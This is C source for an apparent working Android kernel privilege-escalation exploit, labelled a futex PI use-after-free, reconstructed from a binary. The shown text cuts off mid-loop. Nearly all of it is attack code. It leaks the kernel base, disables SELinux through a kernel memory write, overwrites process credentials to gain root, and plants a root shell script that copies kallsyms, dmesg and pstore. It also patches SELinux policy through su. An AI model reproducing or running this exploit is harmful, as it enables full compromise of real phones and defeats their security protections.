/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit (A17 port)
 *
 * Phase 1: Write 1 — SELinux permissive (child-node PI write)
 * Phase 2: Write 2 — cred = forged init_cred copy in our spray page
 *
 * This file was LOST and reconstructed from the shipped A17 binary `e`
 * (not stripped) by CFG/string disassembly matching. The route-root flow
 * (run_rwforge / route_find_own_task / bootid oracle) is the part the
 * A17 tree added on top of the ghostlock-oneplus base main.c.
 */

#include "common.h"
#include "offsets.h"
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/utsname.h>

const struct kernel_offsets *active_offsets = NULL;

/* Override target.h _OFF macros with dynamic offsets from offsets.h table */
#undef SELINUX_ENFORCING_OFF
#undef INIT_CRED_OFF
#undef INIT_TASK_OFF
#undef INIT_UTS_NS_OFF
#undef EMPTY_ZERO_PAGE_OFF
#undef ROOT_TASK_GROUP_OFF
#undef KPTR_RESTRICT_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef KMALLOC_CACHES_OFF
#undef ANON_PIPE_BUF_OPS_OFF
#undef ASHMEM_MISC_FOPS_OFF
#undef ASHMEM_FOPS_OFF
#undef ASHMEM_IOCTL_OFF
#undef ASHMEM_COMPAT_IOCTL_OFF
#undef ASHMEM_MMAP_OFF
#undef ASHMEM_OPEN_OFF
#undef ASHMEM_RELEASE_OFF
#undef ASHMEM_SHOW_FDINFO_OFF
#undef CONFIGFS_READ_ITER_OFF
#undef CONFIGFS_BIN_WRITE_ITER_OFF
#undef COPY_SPLICE_READ_OFF
#undef NOOP_LLSEEK_OFF
#undef CAP_CAPABLE_ACTIVE_OFF
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF

#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
#define INIT_CRED_OFF                 active_offsets->off_init_cred
#define INIT_TASK_OFF                 active_offsets->off_init_task
#define INIT_UTS_NS_OFF               active_offsets->off_init_uts_ns
#define EMPTY_ZERO_PAGE_OFF           active_offsets->off_empty_zero_page
#define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
#define KPTR_RESTRICT_OFF             active_offsets->off_kptr_restrict
#define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
#define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
#define KMALLOC_CACHES_OFF            active_offsets->off_kmalloc_caches
#define ANON_PIPE_BUF_OPS_OFF         active_offsets->off_anon_pipe_buf_ops
#define ASHMEM_MISC_FOPS_OFF          active_offsets->off_ashmem_misc_fops
#define ASHMEM_FOPS_OFF               active_offsets->off_ashmem_fops
#define ASHMEM_IOCTL_OFF              active_offsets->off_ashmem_ioctl
#define ASHMEM_COMPAT_IOCTL_OFF       active_offsets->off_ashmem_compat_ioctl
#define ASHMEM_MMAP_OFF               active_offsets->off_ashmem_mmap
#define ASHMEM_OPEN_OFF               active_offsets->off_ashmem_open
#define ASHMEM_RELEASE_OFF            active_offsets->off_ashmem_release
#define ASHMEM_SHOW_FDINFO_OFF        active_offsets->off_ashmem_show_fdinfo
#define CONFIGFS_READ_ITER_OFF        active_offsets->off_configfs_read_iter
#define CONFIGFS_BIN_WRITE_ITER_OFF   active_offsets->off_configfs_bin_write_iter
#define COPY_SPLICE_READ_OFF          active_offsets->off_copy_splice_read
#define NOOP_LLSEEK_OFF               active_offsets->off_noop_llseek
#define CAP_CAPABLE_ACTIVE_OFF        active_offsets->off_cap_capable_active
#define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
#define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
#define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id

/* Override struct field offsets (task_struct, etc.) with per-device values */
#include "runtime_struct_offsets.h"

static int select_offsets(void) {
  struct utsname uts;
  if (uname(&uts) < 0) return -1;
  pr_info("kernel: %s\n", uts.release);
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
      active_offsets = &known_offsets[i];
      pr_success("offsets matched: %s\n", active_offsets->uname_r);
      /* Publish per-device symbol addresses that other TUs need. INIT_CRED
       * here expands via the redefined INIT_CRED_OFF above, i.e. the runtime
       * table entry rather than target.h's compile-time constant. */
      g_init_cred_image = INIT_CRED;
      if (active_offsets->kernel_phys_load) {
        p0_kernel_phys_load = active_offsets->kernel_phys_load;
      }
      pr_info("init_cred image=%016zx alias=%016zx\n",
              (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
      return 0;
    }
  }
  pr_error("no offsets for kernel: %s\n", uts.release);
  pr_error("add this kernel to offsets.h and rebuild\n");
  return -1;
}

static struct timespec t0;
static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
static __attribute__((noinline)) double timer_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
}
#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)

extern int pselect_child_node;
void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
void clear_pselect_write(void);

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

/* A17 rwforge/route-root state */
uint8_t g_no_punch;          /* 1 during a no-punch prime round (skip consumer) */
void *g_child_shm;           /* shared handshake page (spawn_child) */
uintptr_t rw_page;           /* last rw_trigger spray page (rw_page_ok) */
int perf_task_ncands;
uintptr_t perf_task_cands[PERF_TASK_MAX_CANDS];
int perf_task_cand_votes[PERF_TASK_MAX_CANDS];
uintptr_t g_cfg_buf;         /* configfs_buffer* (physmap) of the armed attr */
uintptr_t g_cfg_buf2;        /* second fake configfs_buffer (cfg-forge fd) */
static int g_cfg_forge_fd = -1;  /* armed fd parked on the rd pipe_buffer array */
static uintptr_t g_fdarr;        /* cached fdt fd-array VA (fdtable walk) */
static uint64_t g_max_fds;
int perf_file_ncands;
uintptr_t perf_file_cands[PERF_FILE_MAX_CANDS];
uint8_t g_slide_valid;
uint64_t g_slide_cached;
uintptr_t g_bringup_F;
int g_wq_armed_fd = -1;   /* fd armed with the payload configfs table (wq-umh) */
uint64_t g_fd_fop;        /* f_op of the fdtable-resolved file (read once) */
static uintptr_t g_own_task;        /* cached own task (fdtable walk reuse) */
uint64_t g_bringup_orig_fmode;
uintptr_t g_bringup_orig_fops;
uintptr_t g_bringup_orig_priv;
uint8_t g_bringup_leaked;
int g_fastroot;

/* deployment-home helpers (defined near wq_umh_readback): G4_HOME env or
 * /data/local/tmp/a — the boot app sets G4_HOME to its private files dir */
static const char *g4home(void);
static const char *gh(const char *suffix);

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("waiter lock chain errno=%d\n", errno);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) usleep(1000);
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) usleep(1000);
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
  while (!atomic_load(&waiter_ready)) usleep(1000);
  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);
  for (;;) sleep(1);
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  int seen = 0;
  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) usleep((useconds_t)delay_usec);
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) break;
        atomic_fetch_add(&consumer_calls, 1);
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
        if (sched_ret != 0) {
          struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
          if (fret == 0) {
            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            sched_ret = 0;
          }
        }
        if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }
  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
  atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0); atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0; cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();
  pthread_t waiter, owner, consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  /* A17: no-punch prime round skips the consumer thread entirely */
  if (g_no_punch != 1)
    SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
    usleep(1000);
  usleep(50000);
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  while (!atomic_load(&route_done)) usleep(5000);
}

static void do_one_write(uintptr_t target, const char *desc, int mode) {
  pr_info("=== %s === target=0x%016zx mode=%d\n", desc, target, mode);
  pselect_child_node = 1;
  set_pselect_write_mode(target, 0, mode);
  TIMER("  heap spray start");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base) { pr_error("  heap spray failed\n"); clear_pselect_write(); }
  TIMER("  heap spray done");
  run_main_route_threads();
  TIMER("  PI route done");
  clear_pselect_write();
}

static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (efd < 0) return 1;
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

/* A17: SELinux policy repair goes through su (load_policy + ksud sepolicy
 * patch) instead of the base tree's in-process policy fix. */
static __attribute__((always_inline)) void fix_selinux_policy(void) {
  system("su -c 'load_policy /sys/fs/selinux/policy' > /dev/null 2>&1");
  system("su -c '/data/adb/ksu/bin/ksud sepolicy patch \"allow * netlink_route_socket { nlmsg_getlink nlmsg_read create bind getopt setopt }\"' > /dev/null 2>&1");
}

static void slab_drain(void) {
  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 5 : 2;
  int batch = (up.tv_sec > 60) ? 400 : 200;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc(batch, sizeof(pid_t));
    int n = 0;
    for (int i = 0; i < batch; i++) {
      drain[i] = fork();
      if (drain[i] == 0) { pause(); _exit(0); }
      if (drain[i] > 0) n++;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
  }
}

/* A17: the helper script is capture-oriented (no ksud late-load here). */
static __attribute__((always_inline)) void write_root_script(void) {
  int sfd = open("/data/local/tmp/.ghostlock_root.sh", O_WRONLY|O_CREAT|O_TRUNC, 0755);
  if (sfd < 0) return;
  const char *script =
    "#!/system/bin/sh\n"
    "echo '[+] root shell pid='$$ 'uid='$(id -u)\n"
    "CAP=/data/local/tmp/cap\n"
    "mkdir -p $CAP && chmod 755 $CAP\n"
    "cat /proc/last_kmsg > $CAP/last_kmsg.txt 2>/dev/null\n"
    "dmesg > $CAP/dmesg.txt 2>/dev/null\n"
    "cat /proc/iomem > $CAP/iomem.txt 2>/dev/null\n"
    "grep -i 'Kernel code' $CAP/iomem.txt\n"
    "ls -la /sys/fs/pstore/ > $CAP/pstore_ls.txt 2>/dev/null\n"
    "for f in /sys/fs/pstore/*; do cp $f $CAP/ 2>/dev/null; done\n"
    "cat /proc/cmdline > $CAP/cmdline.txt 2>/dev/null\n"
    "cat /proc/kallsyms > $CAP/kallsyms.txt 2>/dev/null\n"
    "id > $CAP/id.txt 2>/dev/null\n"
    "chmod 644 $CAP/* 2>/dev/null\n"
    "echo '[+] captures done:' $(ls $CAP | tr '\\n' ' ')\n"
    "echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
    "echo '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
    "echo '[+] done'\n"
    "if [ -t 0 ]; then exec /system/bin/sh -i; fi\n";
  write(sfd, script, strlen(script));
  close(sfd);
}

/* perf_find_task - only used when perf is available (shell context).
 * A17: hammers prctl(PR_SET_NAME) instead of getpid, collects up to 8
 * top-voted physmap candidates into perf_task_cands[] (descending votes). */
static uintptr_t perf_find_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf_event_open failed errno=%d\n", errno); }
  pr_info("perf: opened fd=%d\n", fd);
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { pr_error("perf mmap failed errno=%d\n", errno); }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  pr_info("perf: sampling begin\n");
  for (int i = 0; i < 500000; i++) syscall(__NR_prctl, PR_SET_NAME, "e", 0, 0, 0);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  pr_info("perf: sampling done\n");
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[256]; int nc = 0;
  while (pos < head && nc < 256) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && nc < 256; i++) {
          uint64_t v = regs[i];
          if (v > 0xffffff8000000000ULL && v < 0xffffff8140000000ULL)
            cands[nc++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (!nc) return 0;
  /* top-8 selection by vote count (descending), skipping already-picked */
  perf_task_ncands = 0;
  for (;;) {
    uintptr_t best = 0; int best_cnt = 0;
    for (int i = 0; i < nc; i++) {
      int picked = 0;
      for (int j = 0; j < perf_task_ncands; j++)
        if (perf_task_cands[j] == cands[i]) { picked = 1; break; }
      if (picked) continue;
      int cnt = 0;
      for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
      if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
    }
    if (!best) break;
    perf_task_cands[perf_task_ncands] = best;
    perf_task_cand_votes[perf_task_ncands] = best_cnt;
    perf_task_ncands++;
    if (perf_task_ncands >= PERF_TASK_MAX_CANDS) break;
  }
  for (int i = 0; i < perf_task_ncands; i++)
    pr_info("perf cand[%d]: 0x%016zx (%d/%d votes)\n", i,
            perf_task_cands[i], perf_task_cand_votes[i], nc);
  return perf_task_cands[0];
}

struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };

/* A17: child reports the perf candidate list as a 72-byte struct
 * {int ncands; pad; uintptr_t cands[8]} and handshakes through the
 * shared page: parent writes 'C' to shm[0], child puts getuid() at
 * shm+8 and bumps the ack counter at shm+4; 'G' ends the loop. */
struct task_report {
  int ncands;
  int pad;
  uintptr_t cands[PERF_TASK_MAX_CANDS];
};

static __attribute__((noinline)) void child_main(struct child_pipes *p) {
  close(p->task_r); close(p->cmd_w); close(p->uid_r);
  uintptr_t my_task = perf_find_task();
  struct task_report rep;
  memset(&rep, 0, sizeof(rep));
  rep.ncands = my_task ? perf_task_ncands : 0;
  for (int i = 0; i < perf_task_ncands && i < PERF_TASK_MAX_CANDS; i++) {
    volatile uintptr_t *dst = &rep.cands[i];   /* keep the elementwise copy (e has no memcpy here) */
    *dst = perf_task_cands[i];
  }
  write(p->task_w, &rep, sizeof(rep));
  close(p->task_w);
  if (!my_task) _exit(1);
  for (;;) {
    if (*(volatile uint32_t *)g_child_shm == 'C') {
      uint32_t uid = getuid();
      *(volatile uint32_t *)((char *)g_child_shm + 8) = uid;
      __sync_synchronize();
      (*(volatile uint32_t *)((char *)g_child_shm + 4))++;
      __sync_synchronize();
      *(volatile uint32_t *)g_child_shm = 0;
    } else if (*(volatile uint32_t *)g_child_shm == 'G') {
      break;
    } else {
      usleep(1000);
    }
  }
  if (getuid() != 0) _exit(1);
  pid_t gc = fork();
  if (gc == 0) {
    int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
    if (efd >= 0) { write(efd, "0", 1); close(efd); }
    execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh", NULL);
    _exit(1);
  }
  if (gc > 0) waitpid(gc, NULL, 0);
  for (;;) pause();
}

static pid_t spawn_child(struct child_pipes *p) {
  if (!g_child_shm) {
    void *m = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    g_child_shm = m;
    if (m != MAP_FAILED) memset(m, 0, 4096);
    else g_child_shm = NULL;
  }
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
  p->task_r = p1[0]; p->task_w = p1[1];
  p->cmd_r = p2[0]; p->cmd_w = p2[1];
  p->uid_r = p3[0]; p->uid_w = p3[1];
  pid_t child = fork();
  if (child < 0) return -1;
  if (child == 0) child_main(p);
  close(p->task_w); close(p->cmd_r); close(p->uid_w);
  return child;
}

int run_exploit(int argc, char **argv) {
  (void)argc; (void)argv;
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();

  if (!active_offsets && select_offsets() < 0) return 1;

  log_startup_context();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);

  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  kaslr_done = 1;

  /* A17: opt-in KASLR slide leak before anything else */
  if (!getenv("NO_SLIDE_LEAK")) {
    if (!slide_leak_kernel_base())
      pr_warning("slide leak failed; continuing with slide=0\n");
  }

  timer_reset();
  TIMER("exploit start");

  write_root_script();

  /* W2_BOOTID_TEST: opt-in diagnostic — N boot_id data writes, watching
   * /proc/sys/kernel/random/boot_id for landings */
  if (getenv("W2_BOOTID_TEST")) {
    int ntest = env_int_range("W2_BOOTID_TEST", 8, 1, 64);
    if (!getenv("NO_PRIME_ROUND")) {
      pr_info("bootid test: prime round\n");
      g_no_punch = 1;
      pselect_child_node = 1;
      set_pselect_write_mode(0, 0, 2);
      slab_drain();
      uintptr_t p = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (p) {
        page_base = p;
        atomic_store(&consumer_success, 0);
        run_main_route_threads();
        (void)atomic_load(&consumer_success);
      }
      clear_pselect_write();
      g_no_punch = 0;
    }
    char before[64] = {0};
    int bfd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
    if (bfd >= 0) { read(bfd, before, 63); close(bfd); }
    int total_conn = 0, total_land = 0;
    for (int i = 0; i < ntest; i++) {
      slab_drain();
      uintptr_t bootid_data = P0_PAGE_OFFSET |
        (SLIDE_RANDOM_BOOT_ID_DATA_OFF +
         (p0_kernel_phys_load - P0_PHYS_OFFSET));
      do_one_write(bootid_data, "W2: bootid", 2);
      int conn = atomic_load(&consumer_success) > 0;
      if (conn) total_conn++;
      char now[64] = {0};
      int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
      if (fd >= 0) { read(fd, now, 63); close(fd); }
      int land = strcmp(before, now) != 0;
      if (land) { total_land++; strcpy(before, now); }
      pr_info("BOOTIDTEST round=%d conn=%d land=%d total_conn=%d total_land=%d\n",
              i + 1, conn, land, total_conn, total_land);
    }
    return 0;
  }

  /* Phase 1: Disable SELinux (+ optional fops redirect for UMH path) */
  char *w2_only_env = getenv("W2_ONLY");
  int selinux_ok = w2_only_env ? 1 : check_selinux_off();

  if (active_offsets &&
      active_offsets->off_system_unbound_wq &&
      !selinux_ok &&
      active_offsets->off_ashmem_misc_fops) {
    /* UMH path: mode=4 redirects miscdevice fops via W0's pi_tree.
     * miscdevice starts at ASHMEM_FOPS_PTR (repr(transparent) Registration).
     * fops at miscdevice+0x10 = ASHMEM_MISC_FOPS. (statically dead on A17:
     * both table fields are 0 there) */
    pr_info("UMH path: fops redirect (mode=4)...\n");
    slab_drain();
    TIMER("pre-UMH drain");
    do_one_write(data_addr(ASHMEM_MISC_FOPS), "fops redirect", 4);
    TIMER("fops redirect done");
    selinux_ok = check_selinux_off();
  }

  if (!selinux_ok && !root_child_done) {
    /* Fallback: direct PI write to selinux_enforcing */
    slab_drain();
    TIMER("pre-W1 drain");
    for (int att = 1; att <= 5 && !selinux_ok; att++) {
      pr_info("Write 1 attempt %d/5\n", att);
      slab_drain();
      do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
      usleep(100000);
      if (check_selinux_off()) { pr_success("SELinux DISABLED\n"); selinux_ok = 1; }
    }
    if (!selinux_ok) pr_error("Write 1 failed\n");
    TIMER("Write 1 complete");
  }
  pr_success("SELinux off (UMH or already)\n");

  /* Optional early KDP disable (KDP_FIRST): one W1-style write to
   * kdp_enable, marker-persisted across runs */
  if (!w2_only_env && selinux_ok && getenv("KDP_FIRST")) {
    if (access(gh("/.kdp_done"), F_OK) == 0) {
      pr_info("W-KDP(first): marker present, skipping\n");
    } else {
      slab_drain();
      atomic_store(&consumer_success, 0);
      do_one_write(data_addr(KDP_ENABLE), "W-KDP(first): kdp_enable=0", 1);
      if (atomic_load(&consumer_success) >= 1) {
        int mfd = open(gh("/.kdp_done"), O_WRONLY | O_CREAT, 0644);
        if (mfd >= 0) close(mfd);
      }
      TIMER("W-KDP(first) done");
    }
  }

  /* Phase 2: Check if UMH root succeeded */
  if (root_child_done) {
    pr_success("UMH root done — skipping W2\n");
    TIMER("exploit complete (UMH)");
    pr_info("waiting for su...\n");
    for (int i = 0; i < 60; i++) {
      if (system("su -c 'id' > /dev/null 2>&1") == 0) {
        pr_success("su ready, fixing SELinux policy\n");
        fix_selinux_policy();
        system("su -c 'setenforce 1' > /dev/null 2>&1");
        pr_success("sepolicy fix done\n");
        break;
      }
      sleep(1);
    }
    return 0;
  }

  /* Phase 2 fallback: Find child task_struct + cred overwrite */
  pr_info("UMH not available, falling back to W2 cred path\n");
  slab_drain();
  TIMER("pre-W2 drain");

  struct child_pipes pipes;
  pid_t child = spawn_child(&pipes);
  if (child < 0) { pr_error("fork failed\n"); }

  struct task_report rep;
  memset(&rep, 0, sizeof(rep));
  read(pipes.task_r, &rep, sizeof(rep));
  close(pipes.task_r);
  TIMER("perf_find_task done");

  if (rep.ncands < 1 || !rep.cands[0]) {
    pr_info("perf returned 0, retrying...\n");
    waitpid(child, NULL, 0);
    child = spawn_child(&pipes);
    if (child < 0) { pr_error("retry fork failed\n"); }
    memset(&rep, 0, sizeof(rep));
    read(pipes.task_r, &rep, sizeof(rep));
    close(pipes.task_r);
  }

  if (rep.ncands < 1 || !rep.cands[0]) {
    pr_error("Cannot find task_struct (perf blocked by seccomp?)\n");
  }

  int ncands = rep.ncands;
  pr_info("child_pid=%d child_task=0x%016zx ncands=%d\n", child, rep.cands[0], ncands);
  pselect_child_node = 1;

  char *delay_env = getenv("W2_DELAY_SEC");
  if (delay_env) {
    int delay = atoi(delay_env);
    pr_info("W2_DELAY %ds\n", delay);
    sleep(delay);
  }

  /* Candidate order: a candidate whose comm field showed up as its own perf
   * candidate (cand+TASK_COMM_OFF present in the list) is the real task base
   * — kept first, everything else after. */
  int order[PERF_TASK_MAX_CANDS];
  int kept[PERF_TASK_MAX_CANDS];
  int nkept = 0;
  for (int i = 0; i < ncands; i++) {
    for (int j = 0; j < ncands; j++) {
      if (rep.cands[j] == rep.cands[i] + (uintptr_t)TASK_COMM_OFF) {
        kept[nkept++] = i;
        break;
      }
    }
  }
  memcpy(order, kept, nkept * sizeof(int));
  int norder = nkept;
  for (int i = 0; i < ncands; i++) {
    int is_kept = 0;
    for (int j = 0; j < nkept; j++)
      if (kept[j] == i) { is_kept = 1; break; }
    if (!is_kept) order[norder++] = i;
  }

  /* W2_COMM_PROBE_LEAD: pure diagnostic — for each kept candidate, spawn a
   * "ll_route_keeper" child, comm-probe it, report comm bytes; then exit */
  if (getenv("W2_COMM_PROBE_LEAD")) {
    if (nkept < 1) return 0;
    for (int pos = 0; pos < nkept; pos++) {
      int ci = order[pos];
      uintptr_t cand = rep.cands[ci];
      int first = 1;
      for (int round = 1; round <= 4; round++) {
        pr_info("lead cand %d round %d: comm probe target=0x%016zx\n",
                ci + 1, round, cand + (uintptr_t)TASK_COMM_OFF);
        int pp[2];
        if (pipe2(pp, O_CLOEXEC) == 0) {
          pid_t pc = fork();
          if (pc < 0) { close(pp[0]); close(pp[1]); }
          if (pc == 0) {
            close(pp[0]);
            slab_drain();
            do_one_write(cand + (uintptr_t)TASK_COMM_OFF, "W2: comm probe", 2);
            char b = 1;
            write(pp[1], &b, 1);
            close(pp[1]);
            int dfd = open("/dev/null", O_RDWR | O_CLOEXEC);
            if (dfd >= 0) {
              dup2(dfd, 0); dup2(dfd, 1); dup2(dfd, 2);
              if (dfd >= 3) close(dfd);
            }
            prctl(PR_SET_NAME, "ll_route_keeper", 0, 0, 0);
            for (;;) pause();
          }
          if (pc > 0) {
            close(pp[1]);
            char b = 0;
            read(pp[0], &b, 1);
            close(pp[0]);
          }
        }
        char path[64];
        char cb[16] = {0};
        cb[16 - 1] = 0;
        snprintf(path, sizeof(path), "/proc/%d/comm", child);
        int cfd = open(path, O_RDONLY);
        if (cfd >= 0) {
          read(cfd, cb, 16);
          close(cfd);
          pr_info("comm now: %02x %02x %02x %02x (changed=%d)\n",
                  cb[0], cb[1], cb[2], cb[3],
                  !(cb[0] == 'e' && cb[1] == '\n'));
        } else {
          pr_info("comm now: %02x %02x %02x %02x (changed=%d)\n", 0, 0, 0, 0, 0);
        }
        first = 0;
      }
      (void)first;
    }
    return 0;
  }

  int got_root = 0;
  int nsel = nkept ? nkept : ncands;
  int do_cred = !getenv("KDP_FIRST");
  /* LOST: reconstructed — e keeps this flag live (always 1 in practice) */
  volatile int altflag = 1;  /* first round uses cand+0, later rounds cand-0x40 */
  for (int pos = 0; pos < nsel && !got_root; pos++) {
    int ci = order[pos];
    uintptr_t cand = rep.cands[ci];
    int rounds = (pos >= nkept) ? 2 : 8;
    for (int round = 1; round <= rounds && !got_root; round++) {
      uintptr_t cbase = cand + ((altflag & 1) ? 0 : -0x40);
      const char *sfx = (altflag & 1) ? "" : "-0x40";
      if (do_cred) {
        /* cred write round */
